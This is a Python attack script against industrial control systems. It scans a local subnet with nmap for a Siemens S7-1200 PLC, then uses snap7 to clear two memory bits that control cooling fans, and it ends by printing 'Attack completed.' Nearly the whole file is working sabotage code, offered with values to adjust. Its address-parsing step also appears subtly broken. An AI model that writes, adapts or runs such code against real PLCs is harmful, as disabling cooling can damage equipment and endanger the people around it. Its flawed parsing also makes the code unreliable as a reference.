import snap7
import struct
import subprocess
import re

# Configuration - ADJUST THESE VALUES
PLC_CPU_TYPE = "S7-1200" #Needed to find the PLC IP address
RACK = 0
SLOT = 1

# Target tag for disabling the fan, using a memory bit
DISABLE_FAN_A_TAG = "Activate_Fan_A"
DISABLE_FAN_B_TAG = "Activate_Fan_B"
DISABLE_FAN_TAG_ADDRESS = "M0.0"  #Example
ALTERNATE_DISABLE_FAN_ADDRESS = "M0.1" # Address for the "Activate_Fan_B"

# Define the area type (Memory Area - Flags)
AREA = snap7.types.Areas.MK

# Placeholder for PLC IP Address (will be discovered)
PLC_IP = None

# Function to discover the PLC IP address
def discover_plc_ip(cpu_type):
    """
    Attempts to discover the PLC IP address using nmap.
    This assumes nmap is installed and in the system's PATH.

    Args:
        cpu_type (str): The CPU type (e.g., "S7-1200") to filter results.

    Returns:
        str: The IP address of the PLC if found, otherwise None.
    """
    try:
        # Construct the nmap command.  Adjust the subnet as needed
        command = ["nmap", "-p", "102", "192.168.1.0/24"]  # Scan for port 102 (S7 protocol)
        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = process.communicate()

        if process.returncode != 0:
            print(f"Error during nmap scan: {stderr.decode()}")
            return None

        output = stdout.decode()
        # Regex to find IP addresses with the CPU type in the nmap output
        pattern = r"Nmap scan report for ([\d\.]+).*Device type: PLC Siemens " + re.escape(cpu_type)

        match = re.search(pattern, output)
        if match:
            ip_address = match.group(1)
            print(f"Discovered PLC IP Address: {ip_address}")
            return ip_address
        else:
            print("PLC not found in nmap scan results.")
            return None

    except FileNotFoundError:
        print("nmap is not installed or not in PATH.")
        return None
    except Exception as e:
        print(f"Error during PLC IP discovery: {e}")
        return None

def disable_fan(ip_address, rack, slot, address):
    """
    Disables the fan by setting the specified memory bit to 0.

    Args:
        ip_address (str): The IP address of the PLC.
        rack (int): The rack number of the PLC.
        slot (int): The slot number of the PLC.
        address (str): The memory bit address to set to 0 (e.g., "M0.0").
    """
    try:
        client = snap7.client.Client()
        client.connect(ip_address, rack, slot)

        # Extract byte and bit from the address string
        area, byte_str, bit_str = re.split(r"([A-Z]+)", address)[1:]
        byte = int(byte_str)
        bit = int(bit_str)

        # Determine the area type based on the provided string
        if area == "M":
            area_code = snap7.types.Areas.MK
        elif area == "I":
            area_code = snap7.types.Areas.PE
        elif area == "Q":
            area_code = snap7.types.Areas.PA
        elif area == "DB":
            area_code = snap7.types.Areas.DB
        else:
            raise ValueError("Invalid memory area specified in address.")

        # Read the byte containing the bit
        byte_array = client.read_area(area_code, 0, byte, 1)

        # Clear the specific bit in the byte
        original_byte = byte_array[0]
        mask = 1 << bit
        new_byte = original_byte & ~mask

        # Write the modified byte back to the PLC
        byte_array[0] = new_byte
        client.write_area(area_code, 0, byte, byte_array)

        print(f"Successfully disabled fan by clearing bit {address} on PLC {ip_address}.")

    except Exception as e:
        print(f"Error disabling fan on PLC {ip_address}: {e}")
    finally:
        if 'client' in locals() and client.get_connected():
            client.disconnect()

# Main execution block
if __name__ == "__main__":
    # Discover PLC IP address
    PLC_IP = discover_plc_ip(PLC_CPU_TYPE)

    if PLC_IP:
        # Disable the fan using both addresses
        disable_fan(PLC_IP, RACK, SLOT, DISABLE_FAN_TAG_ADDRESS)
        disable_fan(PLC_IP, RACK, SLOT, ALTERNATE_DISABLE_FAN_ADDRESS)

        print("Attack completed.")
    else:
        print("PLC IP address not found. Attack aborted.")